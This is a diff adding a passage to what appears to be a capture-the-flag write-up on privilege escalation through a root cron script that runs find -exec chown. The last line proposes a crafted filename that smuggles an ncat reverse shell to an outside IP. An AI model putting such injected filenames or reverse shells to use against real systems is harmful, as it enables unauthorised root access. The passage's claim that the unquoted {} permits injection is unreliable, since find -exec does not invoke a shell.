@@ -97,3 +97,60 @@ Vulnerable to CVE-2021-3560
 
 Potentially Vulnerable to CVE-2022-2588
 ```
+also, there seems to be a file in /opt/, called cleanup.sh which is run by root 
+```
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/5 * * * * sudo /opt/cleanup.sh
+```
+that file reads as follows:
+```
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+
+```
+So the script takes a log file, stores it as an old log and truncates the new log, it then finds all .jpg files within the /home/wizard/photobomb folder and execs chown as root on all of them.
+
+now usually if a script is ran as root, while taking input from a user (which in this case would be the file names within the photobomb folder) is very unsecure (good for us :))
+
+first things first i want to take a look at the man page for find, to see how the -exec flag actually works
+```
+-exec command {} +
+              This  variant  of the -exec action runs the specified command on
+              the selected files, but the command line is built  by  appending
+              each  selected file name at the end; the total number of invoca‐
+              tions of the command will  be  much  less  than  the  number  of
+              matched  files.   The command line is built in much the same way
+              that xargs builds its command lines.  Only one instance of  `{}'
+              is  allowed  within the command, and (when find is being invoked
+              from a shell) it should be quoted (for example, '{}') to protect
+              it  from  interpretation  by shells.  The command is executed in
+              the starting directory.  If any invocation with the `+' form re‐
+              turns  a non-zero value as exit status, then find returns a non-
+              zero exit status.  If find encounters an error, this  can  some‐
+              times  cause an immediate exit, so some pending commands may not
+              be run at all.  This variant of -exec always returns true.
+```
+The important thing to note is here is is that the man page suggests to quote the {} whereas in the script it's not quoted! could this mean a crafted filename could be used to make the super user run a reverse shell connection?
+A filename that could fit could be `filename;ncat 10.10.16.51 4242 -e /bin/bash;a.jpg`
